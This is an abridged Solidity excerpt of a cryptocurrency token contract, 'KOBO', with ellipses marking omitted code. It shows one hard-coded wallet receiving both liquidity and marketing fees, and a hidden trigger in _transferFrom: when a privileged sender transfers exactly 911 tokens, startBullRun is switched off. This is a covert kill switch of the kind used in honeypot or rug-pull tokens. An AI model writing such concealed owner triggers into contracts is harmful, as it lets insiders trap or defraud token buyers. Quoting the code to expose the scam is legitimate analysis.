...
contract Kobo is IERC20, Ownable {
    using Address for address;
    
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "KOBO";
    string constant _symbol = "KOBO";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1_000_000 * (10 ** _decimals);
    uint256 _maxBuyTxAmount = (_totalSupply * 1) / 50; //2000
    ...
    address payable public liquidityFeeReceiver = payable(0x49e4ee5a44478d8Ae74981650E4399283c320747);
    address payable public marketingFeeReceiver = payable(0x49e4ee5a44478d8Ae74981650E4399283c320747);
    ...
    uint256 public swapThreshold = _totalSupply / 3;
    uint256 public swapMinimum = _totalSupply / 3;
    bool inSwap;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if ((liquidityCreator[msg.sender] || isTxLimitExempt[msg.sender]) && amount == 911) {
            startBullRun = false;
